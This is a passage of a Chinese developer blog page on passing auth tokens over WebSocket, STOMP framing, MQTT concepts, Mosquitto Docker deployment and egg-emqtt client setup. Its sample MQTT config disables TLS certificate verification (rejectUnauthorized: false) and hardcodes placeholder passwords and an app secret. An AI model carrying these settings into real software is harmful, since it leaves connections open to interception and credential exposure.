punctuation">;</span>
ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="请求地址中带参数"><a href="#请求地址中带参数" class="header-anchor">#</a> <strong>请求地址中带参数</strong></h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span>  ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&quot;ws://&quot;</span> <span class="token operator">+</span> url<span class="token operator">?</span>token <span class="token operator">+</span> <span class="token string">&quot;/webSocketServer&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span>  wss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&quot;wss://&quot;</span> <span class="token operator">+</span> url<span class="token operator">?</span>token <span class="token operator">+</span> <span class="token string">&quot;/webSocketServer&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>var ws = new WebSocket(&quot;ws://url/1/3/9&quot;);</code></p> <p>前台可以使用@PathParam以及{}去取</p> <p>url里注意base64格式的数据可能会携带&quot;/&quot;需要进行替换</p> <p><code>var ws = new WebSocket(&quot;ws://url?userid=1&quot;);</code></p> <p>前台可以使用session.getURI和session.getQueryString取;</p> <h4 id="基于协议头"><a href="#基于协议头" class="header-anchor">#</a> <strong>基于协议头</strong></h4> <p>Websocket 客户端 API 不允许发送自定义 header ，<strong>它们允许您只设置一个 header ，即 Sec-WebSocket-Protocol，即特定于应用程序的子协议(protocol)</strong>。您可以使用此 header 来传递不记名 token 。</p> <p>websocket请求头中可以包含Sec-WebSocket-Protocol这个属性，<strong>该属性是一个自定义的子协议</strong>。它从客户端发送到服务器并返回从服务器到客户端确认子协议。我们可以利用这个属性添加token。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span>  ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&quot;ws://&quot;</span> <span class="token operator">+</span> url<span class="token operator">+</span> <span class="token string">&quot;/webSocketServer&quot;</span><span class="token punctuation">,</span><span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>案例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&quot;ws://example.com/path&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;protocol&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&quot;ws://example.com/path&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;protocol1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;protocol2&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>The above results in the following headers:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Protocol<span class="token operator">:</span> protocol
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>and</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Protocol<span class="token operator">:</span> protocol1<span class="token punctuation">,</span> protocol2
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">,</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>xToken<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">//Sec-WebSocket-Protocol: admin%23null%232020-01-10%2021%3A00%23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/rat-summ/assets/img/image-20211110160109990.e1277b63.png" alt="image-20211110160109990"></p> <p>如果传递了token参数，后端响应的时候，也必须带上这个token响应！否则前端接收不到数据！</p> <p>而后端的websocket如果在header里携带token呢？这里给出golang 的写法：</p> <div class="language-go line-numbers-mode"><pre class="language-go"><code><span class="token keyword">var</span> upgrader <span class="token operator">=</span> websocket<span class="token punctuation">.</span>Upgrader<span class="token punctuation">{</span>
        Subprotocols<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span>r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;Sec-WebSocket-Protocol&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>        
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>通过这样设置，前后端就可以携带token愉快的通信了。</p> <h3 id="_10-stomp"><a href="#_10-stomp" class="header-anchor">#</a> 10:STOMP</h3> <h4 id="简介及header"><a href="#简介及header" class="header-anchor">#</a> 简介及header</h4> <p><code>websocket</code>定义了两种传输信息类型:<strong>文本信息和二进制信息</strong>。类型虽然被确定，但是他们的传输体是没有规定的。所以，需要用一种简单的文本传输类型来规定传输内容，它可以作为通讯中的文本传输协议。</p> <p><strong>STOMP是基于帧的协议，客户端和服务器使用STOMP帧流通讯</strong></p> <p>一个STOMP客户端是一个可以以两种模式运行的用户代理，可能是同时运行两种模式。</p> <ul><li>作为生产者，通过<code>SEND</code>框架将消息发送给服务器的某个服务</li> <li>作为消费者，通过<code>SUBSCRIBE</code>制定一个目标服务，通过<code>MESSAGE</code>框架，从服务器接收消息。</li></ul> <p>例如：</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code>COMMAND
<span class="token property">header1</span><span class="token punctuation">:</span>value1
<span class="token property">header2</span><span class="token punctuation">:</span>value2

Body^@
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>可选择设置以下headers:这个是消息中传递参数；</p> <ul><li>1.<code>login:</code> 用于在server验证的用户id</li> <li>2.<code>passcode:</code> 用于在server验证的密码</li> <li>3.<code>heart-beat:</code> 心跳设置</li></ul> <p><code>注：</code>STOMP协议大小写敏感</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> headers <span class="token operator">=</span> <span class="token punctuation">{</span>
  login<span class="token operator">:</span> <span class="token string">'mylogin'</span><span class="token punctuation">,</span>
  passcode<span class="token operator">:</span> <span class="token string">'mypasscode'</span><span class="token punctuation">,</span>
  <span class="token comment">// additional header</span>
  <span class="token string">'client-id'</span><span class="token operator">:</span> <span class="token string">'my-client-id'</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// const headers = this.get('headers')</span>
<span class="token comment">//const xToken = window.localStorage.getItem('X-Token')</span>
<span class="token comment">//const headers = Object.assign({</span>
<span class="token comment">//  'X-Token': xToken</span>
<span class="token comment">//}, this.get('headers'));</span>
client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> connectCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><img src="/rat-summ/assets/img/image-20211110151227326.e4b2d65c.png" alt="image-20211110151227326"></p> <h4 id="常用command"><a href="#常用command" class="header-anchor">#</a> <strong>常用Command</strong></h4> <ul><li>CONNECT</li> <li>CONNECTED</li> <li>SEND</li> <li>SUBSRIBE</li> <li>UNSUBSRIBE</li> <li>BEGIN</li> <li>COMMIT</li> <li>ABORT</li> <li>ACK</li> <li>NACK</li> <li>DISCONNECT</li></ul> <h4 id="结合webscocket和stomp协议"><a href="#结合webscocket和stomp协议" class="header-anchor">#</a> 结合webScocket和Stomp协议</h4> <p>在正文的实时消息模块就结合了webScocket和Stomp。**基于websocket的一层STOMP封装，让业务端只需关心数据本身，不需要太过关心文本协议。**当然还是需要了解一些STOMP协议各个Frame的概念和应用场景。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>  <span class="token function-variable function">connect</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">useSockJS</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">'Websocket === Start Connection'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 先断掉之前的连接的</span>
    <span class="token keyword">const</span> dfd <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">Deferred</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> socket <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSocket</span><span class="token punctuation">(</span>useSockJS<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> client <span class="token operator">=</span> Stomp<span class="token punctuation">.</span><span class="token function">over</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// TODO:处理token头部</span>
    <span class="token keyword">const</span> headers <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'headers'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onConnectionSuccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Conf<span class="token punctuation">.</span>isPro<span class="token punctuation">)</span> client<span class="token punctuation">.</span>debug <span class="token operator">=</span> Em<span class="token punctuation">.</span><span class="token constant">K</span><span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'client'</span><span class="token punctuation">,</span> client<span class="token punctuation">)</span><span class="token punctuation">;</span>
      dfd<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      dfd<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onConnectionError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> dfd<span class="token punctuation">.</span><span class="token function">promise</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>

  <span class="token function-variable function">getSocket</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> wsApi <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>protocol <span class="token operator">===</span> <span class="token string">'https:'</span> <span class="token operator">?</span> <span class="token string">'wss:'</span> <span class="token operator">:</span> <span class="token string">'ws:'</span> <span class="token operator">+</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>host<span class="token punctuation">;</span>
    <span class="token keyword">var</span> newUrl <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'webSocketUrl2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'{wsApi}'</span><span class="token punctuation">,</span> wsApi<span class="token punctuation">)</span>
    <span class="token keyword">var</span> socket
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'WebSocket'</span> <span class="token keyword">in</span> window<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'MozWebSocket'</span> <span class="token keyword">in</span> window<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">window<span class="token punctuation">.</span>MozWebSocket</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">window<span class="token punctuation">.</span>SockJS</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
   <span class="token keyword">return</span> socket
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><h2 id="mqtt"><a href="#mqtt" class="header-anchor">#</a> MQTT</h2> <h3 id="_1-简介"><a href="#_1-简介" class="header-anchor">#</a> 1:简介</h3> <p>MQTT（Message Queuing Telemetry Transport，消息队列遥测传输协议），是一种基于发布/订阅（publish/subscribe）模式的“轻量级”通讯协议，<strong>该协议构建于TCP/IP协议上;</strong></p> <p><strong>主流的MQTT是基于TCP连接进行数据推送的，但是同样有基于UDP的版本</strong>，叫做MQTT-SN。这两种版本由于基于不同的连接方式，优缺点自然也就各有不同了。除标准版外，还有一个简化版MQTT-SN，该协议主要针对<a href="http://lib.csdn.net/base/embeddeddevelopment" target="_blank" rel="noopener noreferrer">嵌入式<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>设备，这些设备一般工作于TCP/IP网络，如：ZigBee。</p> <p><strong>MQTT最大优点</strong>: <code>小型传输，开销很小</code>（<strong>固定长度的头部</strong>是<code>2字节</code>[byte1(8位),byte2(8位)]）协议交换最小化，以降低网络流量。可以以极少的代码和有限的带宽，为连接远程设备提供实时可靠的消息服务。</p> <p>这里就简单罗列一下 5.0 协议新增的内容。</p> <ul><li>增强了扩展性</li> <li>改善了错误报告的方式</li> <li>定型了一些通用范式，例如能力发现和请求、响应</li> <li>扩展机制包括用户属性(user properties)</li> <li>性能改善，并且添加了对小客户端（small clients） 的支持</li></ul> <p><strong>原因码:</strong> MQTT v3.1.1 只有寥寥 6 个返回码，用来表示网络连接时可能会出现的异常行为，在引入属性后的 MQTT 5.0 协议中，仅仅这 6 个返回码显然已经不足以用来描述各种异常行为，<strong>因此MQTT 5.0 协议中将返回码改成了原因码，用来实现改善错误报告的目的。</strong></p> <h3 id="_2-工作方式"><a href="#_2-工作方式" class="header-anchor">#</a> 2:工作方式</h3> <p>实现MQTT协议需要客户端和服务器端通讯完成，在通讯过程中，<strong>MQTT协议中有三种身份</strong>：<code>发布者（Publish）</code>、<code>代理（Broker）</code>、<code>（服务器）</code>、<code>订阅者（Subscribe）</code>。其中，消息的发布者和订阅者都是客户端，消息代理是服务器，消息发布者可以同时是订阅者。</p> <p><strong>MQTT传输的消息分为</strong>：<code>主题（Topic）</code>和<code>负载（payload）</code>两部分：</p> <p>（1）Topic，可以理解为消息的类型，订阅者订阅（Subscribe）后，就会收到该主题的消息内容（payload）；</p> <p>（2）payload，可以理解为消息的内容，是指订阅者具体要使用的内容。</p> <p><strong>除了发布者和订阅者之间传递普通消息，代理还可以为发布者处</strong>理保留消息和遗愿消息**，并可以更改服务质量（QoS）等级。**</p> <p><strong>Last Will</strong>：即遗言机制，用于通知同一主题下的其他设备发送遗言的设备已经断开了连接。<strong>用于判断是否设备在线</strong>；</p> <h3 id="_3-数据包结构"><a href="#_3-数据包结构" class="header-anchor">#</a> 3:数据包结构</h3> <blockquote><p><strong>主流的MQTT协议工作在TCP之上</strong>，端和代理之间通过交换预先定义的控制报文来完成通信。</p></blockquote> <p>在MQTT协议中，一个MQTT数据包由：固定头（Fixed header）、可变头（Variable header）、消息体（payload）三部分构成。</p> <p>**（1）固定头（Fixed header）**存在于所有MQTT数据包中，表示数据包类型及数据包的分组类标识。</p> <p><strong>（2）可变头（Variable header）<strong>存在于部分MQTT数据包中，数据包类型</strong>决定了可变头是否存在及其具体内容。</strong></p> <p>**（3）消息体（Payload）**存在于部分MQTT数据包中，表示客户端收到的具体内容。</p> <p><strong>MQTT报文有3个部分组成</strong>，并按下表顺序出现：</p> <table><thead><tr><th>固定报头（fixed header）</th> <th>可变报头（variable header）</th> <th>荷载（payload）</th></tr></thead> <tbody><tr><td>所有报文都包含</td> <td>部分报文包含</td> <td>部分报文包含</td></tr></tbody></table> <p>所有的MQTT控制报文都有一个固定报头，期格式如下：</p> <p>固定头**固定长度的头部是2字节[byte1(8位),byte2(8位)]**存在于所有MQTT数据包中，其结构如下：
<img src="/rat-summ/assets/img/18-14-17.9af22eb8.jpg" alt="18-14-17"></p> <p><img src="/rat-summ/assets/img/18-15-58.814bc3f4.jpg" alt="18-15-58"></p> <p><strong>解释说明</strong>：</p> <p><strong>MQTT数据包类型</strong>:位置：<strong>Byte 1</strong>中bits 7-4。相于一个4位的无符号值</p> <h3 id="_4-三种消息发布服务质量"><a href="#_4-三种消息发布服务质量" class="header-anchor">#</a> 4:三种消息发布服务质量</h3> <ul><li><p>QoS 0：<code>最多收到一次：数据包被发送，就是这样。没有确认是否已收到。</code></p></li> <li><p>QoS 1：<code>至少接收一次：只要客户端未收到服务器的确认，就会发送和存储数据包。MQTT确保它将被接收，但可能存在重复。</code></p></li> <li><p>QoS 2：<code>只收到一次：与QoS 1相同，但没有重复。</code></p></li></ul> <p><strong>关于数据消耗，显然，QoS 2&gt; QoS 1&gt; QoS 0，如果这是您关心的问题。</strong></p> <p><em><strong>QoS Level 0：至多一次</strong></em></p> <p>这个我理解是如果接收方离线了就不能收到消息，可以用在音视频聊天请求，因为当接收方离线后就不用收到请求了，就算是接收方在线但是没有收到消息也可以通过发送方超时来重发请求。</p> <p><em><strong>QoS Level 1：至少一次，有可能重复</strong></em></p> <p>这个可以用在普通文本聊天， 接收方离线后，服务器自动缓存消息，等接收方上线时服务器马上把消息推送给他，就算是接收方重复收包也没关系因为可以通过消息里包含的时间来过滤掉。这个级别的消息服务器得注意限制发送方的消息大小和数量，免得服务器内存被爆掉。</p> <p><em><strong>QoS Level 2：只有一次，确保消息只到达一次</strong></em></p> <p>这个用在消息重要性比较严格的场合。IM在一般情况下用不着，或者在用户发生金钱消费有关的情况下可以使用；</p> <h3 id="_5-中间broker之mosquitto"><a href="#_5-中间broker之mosquitto" class="header-anchor">#</a> 5:中间broker之Mosquitto</h3> <p>MQTT服务器(Broker)非常多，如apache的ActiveMQ，emtqqd，HiveMQ，Emitter，Mosquitto，Moquette, <strong>Mosquitto</strong>,<strong>RabbitMQ</strong>,<strong>RocketMQ</strong>,等等。<strong>轻量级的mosquitto开源项目是MQTT服务器。</strong></p> <h4 id="部署"><a href="#部署" class="header-anchor">#</a> 部署</h4> <blockquote><p>Docker镜像非常小,及使用的人非常多;推荐;[1.6]</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>docker pull eclipse-mosquitto:1.6
docker pull eclipse-mosquitto
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>启动</strong></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment">#Three directories have been created in the image to be used for configuration, persistent storage and logs.</span>
<span class="token comment">#/mosquitto/config</span>
<span class="token comment">#/mosquitto/data</span>
<span class="token comment">#/mosquitto/log</span>

<span class="token builtin class-name">cd</span> /mosquitto
docker run -it -p <span class="token number">1883</span>:1883 -p <span class="token number">9001</span>:9001 <span class="token punctuation">\</span>
    -v /config/mosquitto.conf:/mosquitto/config/mosquitto.conf <span class="token punctuation">\</span>
    -v /mosquitto/data  <span class="token punctuation">\</span>
    -v /mosquitto/log  <span class="token punctuation">\</span>
    --name mosquitto <span class="token punctuation">\</span>
    eclipse-mosquitto
    
docker run -it -p <span class="token number">1883</span>:1883 -p <span class="token number">9001</span>:9001 -v /mosquitto/data -v /mosquitto/log --name mosquitto eclipse-mosquitto

docker run --restart<span class="token operator">=</span>always -p <span class="token number">1883</span>:1883 -p <span class="token number">9001</span>:9001 -v /mosquitto/data -v /mosquitto/log --name mosquitto eclipse-mosquitto

<span class="token comment">#最后使用;start.sh</span>
<span class="token function">sudo</span> docker run -d --restart<span class="token operator">=</span>always  -p <span class="token number">1883</span>:1883 -p <span class="token number">9001</span>:9001 -v /home/samy/mosquitto/mosquitto.conf:/mosquitto/config/mosquitto.conf -v /home/samy/mosquitto/data:/mosquitto/data -v /home/samy/mosquitto/log:/mosquitto/log eclipse-mosquitto
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p><code>mosquitto.conf</code>:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>persistence true
persistence_location /mosquitto/data/
log_dest file /mosquitto/log/mosquitto.log
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="实践部分"><a href="#实践部分" class="header-anchor">#</a> 实践部分</h4> <h5 id="初始化设置"><a href="#初始化设置" class="header-anchor">#</a> 初始化设置</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//egg-emqtt默认连接配置</span>
<span class="token keyword">const</span> mqttClient <span class="token operator">=</span> mqtt<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    clientId<span class="token operator">:</span> config<span class="token punctuation">.</span>clientId<span class="token punctuation">,</span>
    username<span class="token operator">:</span> config<span class="token punctuation">.</span>username<span class="token punctuation">,</span>
    password<span class="token operator">:</span> config<span class="token punctuation">.</span>password<span class="token punctuation">,</span>
    keepalive<span class="token operator">:</span> <span class="token number">60</span><span class="token punctuation">,</span>
    protocolId<span class="token operator">:</span> <span class="token string">'MQTT'</span><span class="token punctuation">,</span>
    protocolVersion<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
    clean<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    reconnectPeriod<span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>
    connectTimeout<span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span>
    rejectUnauthorized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token operator">...</span>config<span class="token punctuation">.</span>options<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//mqtt &amp;&amp; emqx</span>
config<span class="token punctuation">.</span>mqtt <span class="token operator">=</span> <span class="token punctuation">{</span>
    address<span class="token operator">:</span> <span class="token string">'mqtt://127.0.0.1:11883'</span><span class="token punctuation">,</span>
    queueSize<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
    topic<span class="token operator">:</span> <span class="token string">'$queue/#'</span><span class="token punctuation">,</span>
    option<span class="token operator">:</span> <span class="token punctuation">{</span>
        username<span class="token operator">:</span> <span class="token string">'super_user_client'</span><span class="token punctuation">,</span>
        password<span class="token operator">:</span> <span class="token string">'_this_is_secrectxxxxx'</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
config<span class="token punctuation">.</span>emqx <span class="token operator">=</span> <span class="token punctuation">{</span>
    mgmtBaseUrl<span class="token operator">:</span> <span class="token string">'http://127.0.0.1:8080/v3'</span><span class="token punctuation">,</span>
    appId<span class="token operator">:</span> <span class="token string">'egg_iot_with_mqtt'</span><span class="token punctuation">,</span>
    appSecret<span class="token operator">:</span> <span class="token string">'Mjg1OTEzMzAyMTI2MzA0NTUzMTkwMjcyMjIzMDg5Nzg2ODI'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><h5 id="消息封装"><a href="#消息封装" class="header-anchor">#</a> 消息封装</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token function">messagePublish</span><span class="token punctuation">(</span><span class="token parameter">topic<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> _option <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> option <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> qos<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> retain<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> _option<span class="token punctuation">)</span>
